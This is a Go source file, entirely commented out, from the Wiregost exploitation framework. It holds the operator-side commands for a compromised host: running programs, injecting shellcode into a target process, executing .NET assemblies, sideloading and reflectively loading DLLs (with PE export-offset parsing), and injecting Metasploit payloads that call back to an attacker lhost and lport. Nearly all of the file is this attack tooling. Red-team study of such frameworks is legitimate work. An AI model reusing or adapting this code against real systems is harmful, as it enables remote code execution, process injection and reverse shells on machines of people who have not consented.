// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package commands

// import (
//         "bytes"
//         "debug/pe"
//         "encoding/binary"
//         "fmt"
//         "io/ioutil"
//         "log"
//         "os"
//         "regexp"
//         "strconv"
//         "strings"
//         "time"
//
//         "github.com/gogo/protobuf/proto"
//
//         "github.com/maxlandon/wiregost/client/spin"
//         clientpb "github.com/maxlandon/wiregost/protobuf/client"
//         ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
// )
//
// func registerExecuteCommands() {
//
//         execute := &Command{
//                 Name: "execute",
//                 Args: []*Arg{
//                         &Arg{Name: "args", Type: "string"},
//                         &Arg{Name: "output", Type: "boolean"},
//                 },
//                 Handle: func(r *Request) error {
//                         fmt.Println()
//                         execute(r.Args, *r.context, r.context.Server.RPC)
//                         return nil
//                 },
//         }
//         AddCommand("agent", execute)
//
//         shellcode := &Command{
//                 Name: "execute-shellcode",
//                 Args: []*Arg{
//                         &Arg{Name: "pid", Type: "string"},
//                         &Arg{Name: "rwx-pages", Type: "boolean"},
//                 },
//                 Handle: func(r *Request) error {
//                         fmt.Println()
//                         executeShellcode(r.Args, *r.context, r.context.Server.RPC)
//                         return nil
//                 },
//         }
//         AddCommand("agent", shellcode)
//
//         assembly := &Command{
//                 Name: "execute-assembly",
//                 Args: []*Arg{
//                         &Arg{Name: "proc", Type: "string"},
//                         &Arg{Name: "args", Type: "string"},
//                         &Arg{Name: "timeout", Type: "int"},
//                 },
//                 Handle: func(r *Request) error {
//                         fmt.Println()
//                         executeAssembly(r.Args, *r.context, r.context.Server.RPC)
//                         return nil
//                 },
//         }
//         AddCommand("agent", assembly)
//
//         sideload := &Command{
//                 Name: "sideload",
//                 Args: []*Arg{
//                         &Arg{Name: "proc", Type: "string"},
//                         &Arg{Name: "args", Type: "string"},
//                         &Arg{Name: "timeout", Type: "int"},
//                 },
//                 Handle: func(r *Request) error {
//                         fmt.Println()
//                         sideloadDll(r.Args, *r.context, r.context.Server.RPC)
//                         return nil
//                 },
//         }
//         AddCommand("agent", sideload)
//
//         spawndll := &Command{
//                 Name: "spawn_dll",
//                 Args: []*Arg{
//                         &Arg{Name: "proc", Type: "string"},
//                         &Arg{Name: "export", Type: "string"},
//                         &Arg{Name: "args", Type: "string"},
//                         &Arg{Name: "timeout", Type: "int"},
//                 },
//                 Handle: func(r *Request) error {
//                         fmt.Println()
//                         spawnDll(r.Args, *r.context, r.context.Server.RPC)
//                         return nil
//                 },
//         }
//         AddCommand("agent", spawndll)
//
//         msfinject := &Command{
//                 Name: "msf-inject",
//                 Args: []*Arg{
//                         &Arg{Name: "lhost", Type: "string"},
//                         &Arg{Name: "lport", Type: "int"},
//                         &Arg{Name: "payload", Type: "string"},
//                         &Arg{Name: "encoder", Type: "string"},
//                         &Arg{Name: "iterations", Type: "int"},
//                 },
//                 Handle: func(r *Request) error {
//                         fmt.Println()
//                         msfInject(r.Args, *r.context, r.context.Server.RPC)
//                         return nil
//                 },
//         }
//         AddCommand("agent", msfinject)
// }
//
// func execute(args []string, ctx ShellContext, rpc RPCServer) {
//
//         if len(args) != 1 {
//                 fmt.Printf(Warn + "Please provide a path. See `help execute` for more info.\n")
//                 return
//         }
//
//         cmdPath := args[0]
//         opts := executeFilters(args)
//         var cargs string
//         strargs, found := opts["args"]
//         if found {
//                 cargs = strargs.(string)
//         }
//
//         if len(args) != 0 {
//                 cargs = cmdPath + " " + cargs
//         }
//
//         var output bool
//         out, found := opts["output"]
//         if found {
//                 output = out.(bool)
//         }
//
//         data, _ := proto.Marshal(&ghostpb.ExecuteReq{
//                 GhostID: ctx.Ghost.ID,
//                 Path:    cmdPath,
//                 Args:    strings.Split(cargs, " "),
//                 Output:  output,
//         })
//         resp := <-rpc(&ghostpb.Envelope{
//                 Type: ghostpb.MsgExecuteReq,
//                 Data: data,
//         }, defaultTimeout)
//
//         if resp.Err != "" {
//                 fmt.Printf(RPCError+"%s\n", resp.Err)
//                 return
//         }
//
//         execResp := &ghostpb.Execute{}
//         err := proto.Unmarshal(resp.Data, execResp)
//         if err != nil {
//                 fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
//                 return
//         }
//         if execResp.Error != "" {
//                 fmt.Printf(Error+"%s\n", resp.Err)
//                 return
//         }
//         if output {
//                 fmt.Printf(Info+"Output:\n%s", execResp.Result)
//         }
// }
//
// func executeShellcode(args []string, ctx ShellContext, rpc RPCServer) {
//
//         ghost := ctx.Ghost
//
//         if len(args) < 1 {
//                 fmt.Printf(Warn + "You must provide a path to the shellcode\n")
//                 return
//         }
//
//         opts := executeFilters(args)
//
//         var pid int
//         spid, found := opts["pid"]
//         if found {
//                 pid, _ = spid.(int)
//         } else {
//                 pid = -1
//         }
//
//         var rwx = false
//         srwx, found := opts["rwx-pages"]
//         if found {
//                 rwx = srwx.(bool)
//         }
//
//         shellcodePath := args[0]
//
//         shellcodeBin, err := ioutil.ReadFile(shellcodePath)
//         if err != nil {
//                 fmt.Printf(Warn+"Error: %s\n", err.Error())
//         }
//         ctrl := make(chan bool)
//         msg := fmt.Sprintf("Sending shellcode to %s ...", ghost.Name)
//         go spin.Until(msg, ctrl)
//         data, _ := proto.Marshal(&clientpb.TaskReq{
//                 Data:     shellcodeBin,
//                 GhostID:  ctx.Ghost.ID,
//                 RwxPages: rwx,
//                 Pid:      uint32(pid),
//         })
//         resp := <-rpc(&ghostpb.Envelope{
//                 Type: clientpb.MsgTask,
//                 Data: data,
//         }, defaultTimeout)
//         ctrl <- true
//         <-ctrl
//         if resp.Err != "" {
//                 fmt.Printf(RPCError+"%s\n", resp.Err)
//         }
//         fmt.Printf(Info + "Executed payload on target\n")
// }
//
// func executeAssembly(args []string, ctx ShellContext, rpc RPCServer) {
//
//         if len(args) < 1 {
//                 fmt.Printf(Warn + "Please provide valid arguments.\n")
//                 return
//         }
//
//         opts := executeFilters(args)
//
//         var cTimeout int
//         timeout, found := opts["timeout"]
//         if found {
//                 cTimeout, _ = strconv.Atoi((timeout.(string)))
//         } else {
//                 cTimeout = 30
//         }
//         cmdTimeout := time.Duration(cTimeout) * time.Second
//
//         assemblyBytes, err := ioutil.ReadFile(args[0])
//         if err != nil {
//                 fmt.Printf(Warn+"%s", err.Error())
//                 return
//         }
//
//         var process string
//         proc, found := opts["proc"]
//         if found {
//                 process = proc.(string)
//         }
//
//         assemblyArgs := ""
//         cargs, found := opts["args"]
//         if found {
//                 assemblyArgs = cargs.(string)
//         }
//
//         ctrl := make(chan bool)
//         go spin.Until("Executing assembly ...", ctrl)
//         data, _ := proto.Marshal(&ghostpb.ExecuteAssemblyReq{
//                 GhostID:    ctx.Ghost.ID,
//                 Timeout:    int32(cTimeout),
//                 Arguments:  assemblyArgs,
//                 Process:    process,
//                 Assembly:   assemblyBytes,
//                 HostingDll: []byte{},
//         })
//
//         resp := <-rpc(&ghostpb.Envelope{
//                 Data: data,
//                 Type: clientpb.MsgExecuteAssemblyReq,
//         }, cmdTimeout)
//         ctrl <- true
//         <-ctrl
//         execResp := &ghostpb.ExecuteAssembly{}
//         proto.Unmarshal(resp.Data, execResp)
//         if execResp.Error != "" {
//                 fmt.Printf(RPCError+"%s\n", resp.Err)
//                 return
//         }
//         fmt.Printf("\n"+Info+"Assembly output:\n%s", execResp.Output)
// }
//
// // sideload --process --get-output PATH_TO_DLL EntryPoint Args...
// func sideloadDll(args []string, ctx ShellContext, rpc RPCServer) {
//
//         if len(args) < 2 {
//                 fmt.Printf(Warn + "See `help sideload` for usage.")
//                 return
//         }
//
//         binPath := args[0]
//         entryPoint := args[1]
//
//         opts := executeFilters(args)
//
//         assemblyArgs := ""
//         cargs, found := opts["args"]
//         if found {
//                 assemblyArgs = cargs.(string)
//         }
//
//         var process string
//         proc, found := opts["proc"]
//         if found {
//                 process = proc.(string)
//         }
//
//         var cTimeout int
//         timeout, found := opts["timeout"]
//         if found {
//                 cTimeout, _ = strconv.Atoi((timeout.(string)))
//         } else {
//                 cTimeout = 30
//         }
//         cmdTimeout := time.Duration(cTimeout) * time.Second
//
//         binData, err := ioutil.ReadFile(binPath)
//         if err != nil {
//                 fmt.Printf(Warn+"%s", err.Error())
//                 return
//         }
//         ctrl := make(chan bool)
//         go spin.Until(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
//         data, _ := proto.Marshal(&clientpb.SideloadReq{
//                 Data:       binData,
//                 Args:       assemblyArgs,
//                 ProcName:   process,
//                 EntryPoint: entryPoint,
//                 GhostID:    ctx.Ghost.ID,
//         })
//
//         resp := <-rpc(&ghostpb.Envelope{
//                 Data: data,
//                 Type: clientpb.MsgSideloadReq,
//         }, cmdTimeout)
//         ctrl <- true
//         <-ctrl
//         execResp := &ghostpb.Sideload{}
//         proto.Unmarshal(resp.Data, execResp)
//         if execResp.Error != "" {
//                 fmt.Printf(RPCError+"%s\n", resp.Err)
//                 return
//         }
//         if len(execResp.Result) > 0 {
//                 fmt.Printf("\n"+Info+"Output:\n%s", execResp.Result)
//         }
// }
//
// // spawnDll --process --export  PATH_TO_DLL Args...
// func spawnDll(args []string, ctx ShellContext, rpc RPCServer) {
//
//         if len(args) < 1 {
//                 fmt.Printf(Warn + "See `help spawndll` for usage.")
//                 return
//         }
//
//         binPath := args[0]
//         opts := executeFilters(args)
//
//         assemblyArgs := ""
//         cargs, found := opts["args"]
//         if found {
//                 assemblyArgs = cargs.(string)
//         }
//
//         var process string
//         proc, found := opts["proc"]
//         if found {
//                 process = proc.(string)
//         }
//
//         var cTimeout int
//         timeout, found := opts["timeout"]
//         if found {
//                 cTimeout, _ = strconv.Atoi((timeout.(string)))
//         } else {
//                 cTimeout = 30
//         }
//         cmdTimeout := time.Duration(cTimeout) * time.Second
//
//         var exportName string
//         export, found := opts["export"]
//         if found {
//                 exportName = export.(string)
//         } else {
//                 fmt.Printf(Warn + "Missing 'export' option: See `help spawndll` for usage.")
//         }
//
//         offset, err := getExportOffset(binPath, exportName)
//         if err != nil {
//                 fmt.Printf(Warn+"%s", err.Error())
//                 return
//         }
//
//         binData, err := ioutil.ReadFile(binPath)
//         if err != nil {
//                 fmt.Printf(Warn+"%s", err.Error())
//                 return
//         }
//         ctrl := make(chan bool)
//         go spin.Until(fmt.Sprintf("Executing reflective dll %s", binPath), ctrl)
//         data, _ := proto.Marshal(&ghostpb.SpawnDllReq{
//                 Data:     binData,
//                 Args:     assemblyArgs,
//                 ProcName: process,
//                 Offset:   offset,
//                 GhostID:  ctx.Ghost.ID,
//         })
//
//         resp := <-rpc(&ghostpb.Envelope{
//                 Data: data,
//                 Type: ghostpb.MsgSpawnDllReq,
//         }, cmdTimeout)
//         ctrl <- true
//         <-ctrl
//         execResp := &ghostpb.SpawnDll{}
//         proto.Unmarshal(resp.Data, execResp)
//         if execResp.Error != "" {
//                 fmt.Printf(RPCError+"%s\n", resp.Err)
//                 return
//         }
//         if len(execResp.Result) > 0 {
//                 fmt.Printf("\n"+Info+"Output:\n%s", execResp.Result)
//         }
// }
//
// // ExportDirectory - stores the Export data
// type ExportDirectory struct {
//         Characteristics       uint32
//         TimeDateStamp         uint32
//         MajorVersion          uint16
//         MinorVersion          uint16
//         Name                  uint32
//         Base                  uint32
//         NumberOfFunctions     uint32
//         NumberOfNames         uint32
//         AddressOfFunctions    uint32 // RVA from base of image
//         AddressOfNames        uint32 // RVA from base of image
//         AddressOfNameOrdinals uint32 // RVA from base of image
// }
//
// func rvaToFoa(rva uint32, pefile *pe.File) uint32 {
//         var offset uint32
//         for _, section := range pefile.Sections {
//                 if rva >= section.SectionHeader.VirtualAddress && rva <= section.SectionHeader.VirtualAddress+section.SectionHeader.Size {
//                         offset = section.SectionHeader.Offset + (rva - section.SectionHeader.VirtualAddress)
//                 }
//         }
//         return offset
// }
//
// func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
//         nameRva := binary.LittleEndian.Uint32(rawData[index:])
//         nameFOA := rvaToFoa(nameRva, fpe)
//         funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
//         if err != nil {
//                 log.Fatal(err)
//                 return ""
//         }
//         funcName := string(funcNameBytes[:len(funcNameBytes)-1])
//         return funcName
// }
//
// func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32) uint32 {
//         ordRva := binary.LittleEndian.Uint16(rawData[index:])
//         funcArrayIndex := funcArrayFoa + uint32(ordRva)*8
//         funcRVA := binary.LittleEndian.Uint32(rawData[funcArrayIndex:])
//         funcOffset := rvaToFoa(funcRVA, fpe)
//         return funcOffset
// }
//
// func getExportOffset(filepath string, exportName string) (funcOffset uint32, err error) {
//         rawData, err := ioutil.ReadFile(filepath)
//         if err != nil {
//                 return 0, err
//         }
//         handle, err := os.Open(filepath)
//         if err != nil {
//                 return 0, err
//         }
//         defer handle.Close()
//         fpe, _ := pe.NewFile(handle)
//         exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
//         var offset = rvaToFoa(exportDirectoryRVA, fpe)
//         exportDir := ExportDirectory{}
//         buff := &bytes.Buffer{}
//         buff.Write(rawData[offset:])
//         err = binary.Read(buff, binary.LittleEndian, &exportDir)
//         if err != nil {
//                 return 0, err
//         }
//         current := exportDir.AddressOfNames
//         nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
//         ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
//         funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)
//
//         for i := uint32(0); i < exportDir.NumberOfNames; i++ {
//                 index := nameArrayFOA + i*8
//                 name := getFuncName(index, rawData, fpe)
//                 if strings.Contains(name, exportName) {
//                         ordIndex := ordinalArrayFOA + i*2
//                         funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
//                 }
//                 current += uint32(binary.Size(i))
//         }
//
//         return
// }
//
// func msfInject(args []string, ctx ShellContext, rpc RPCServer) {
//
//         opts := executeFilters(args)
//         var lhost string
//         slhost, found := opts["lhost"]
//         if found {
//                 lhost = slhost.(string)
//         } else {
//                 fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, "msf-inject")
//                 return
//         }
//
//         var pid int
//         spid, found := opts["pid"]
//         if found {
//                 pid = spid.(int)
//         } else {
//                 fmt.Printf(Warn+"Invalid pid '%s', see `help %s`\n", lhost, "msf-inject")
//                 return
//         }
//
//         var lport int
//         port, found := opts["lport"]
//         if found {
//                 lport = port.(int)
//         }
//
//         var payloadName string
//         payload, found := opts["payload"]
//         if found {
//                 payloadName = payload.(string)
//         }
//
//         var encoder string
//         enc, found := opts["encoder"]
//         if found {
//                 encoder = enc.(string)
//         }
//
//         var iterations int
//         iters, found := opts["iterations"]
//         if found {
//                 iterations = iters.(int)
//         }
//
//         ghost := ctx.Ghost
//
//         ctrl := make(chan bool)
//         msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
//                 payloadName, ghost.OS, ghost.Arch, lhost, lport)
//         go spin.Until(msg, ctrl)
//         data, _ := proto.Marshal(&clientpb.MSFInjectReq{
//                 Payload:    payloadName,
//                 LHost:      lhost,
//                 LPort:      int32(lport),
//                 Encoder:    encoder,
//                 Iterations: int32(iterations),
//                 PID:        int32(pid),
//                 GhostID:    ctx.Ghost.ID,
//         })
//         resp := <-rpc(&ghostpb.Envelope{
//                 Type: clientpb.MsgMsfInject,
//                 Data: data,
//         }, defaultTimeout)
//         ctrl <- true
//         <-ctrl
//         if resp.Err != "" {
//                 fmt.Printf(Warn+"%s\n", resp.Err)
//                 return
//         }
//
//         fmt.Printf(Info + "Executed payload on target\n")
// }
//
// func executeFilters(args []string) (opts map[string]interface{}) {
//         opts = make(map[string]interface{}, 0)
//
//         for _, arg := range args {
//
//                 // Output shellcode/payload
//                 if strings.Contains(arg, "output") {
//                         vals := strings.Split(arg, "=")
//                         opts["output"], _ = strconv.ParseBool(vals[1])
//                 }
//                 if strings.Contains(arg, "rwx-pages") {
//                         vals := strings.Split(arg, "=")
//                         opts["rwx-pages"], _ = strconv.ParseBool(vals[1])
//                 }
//                 // Process
//                 if strings.Contains(arg, "proc") {
//                         vals := strings.Split(arg, "=")
//                         opts["proc"] = vals[1]
//                 }
//                 // Owner
//                 if strings.Contains(arg, "export") {
//                         vals := strings.Split(arg, "=")
//                         opts["export"] = vals[1]
//                 }
//                 // Process ID
//                 if strings.Contains(arg, "pid") {
//                         vals := strings.Split(arg, "=")
//                         timeout, _ := strconv.Atoi(vals[1])
//                         opts["pid"] = timeout
//                 }
//                 // Timeout
//                 if strings.Contains(arg, "timeout") {
//                         vals := strings.Split(arg, "=")
//                         timeout, _ := strconv.Atoi(vals[1])
//                         opts["timeout"] = timeout
//                 }
//                 // MSF Payload
//                 if strings.Contains(arg, "payload") {
//                         vals := strings.Split(arg, "=")
//                         opts["payload"] = vals[1]
//                 }
//                 // MSF LHost
//                 if strings.Contains(arg, "lhost") {
//                         vals := strings.Split(arg, "=")
//                         opts["lhost"] = vals[1]
//                 }
//                 // MSF LPort
//                 if strings.Contains(arg, "lport") {
//                         vals := strings.Split(arg, "=")
//                         port, _ := strconv.Atoi(vals[1])
//                         opts["lport"] = port
//                 }
//                 // MSF Encoder
//                 if strings.Contains(arg, "encoder") {
//                         vals := strings.Split(arg, "=")
//                         opts["encoder"] = vals[1]
//                 }
//                 // MSF Encoder Iterations
//                 if strings.Contains(arg, "iterations") {
//                         vals := strings.Split(arg, "=")
//                         iters, _ := strconv.Atoi(vals[1])
//                         opts["iterations"] = iters
//                 }
//
//                 // Special Arguments
//                 if strings.Contains(arg, "args") {
//                         desc := regexp.MustCompile(`\b(args){1}.*"`)
//                         result := desc.FindStringSubmatch(strings.Join(args, " "))
//                         opts["args"] = strings.Trim(strings.TrimPrefix(result[0], "args="), "\"")
//                 }
//         }
//
//         return opts
//
// }
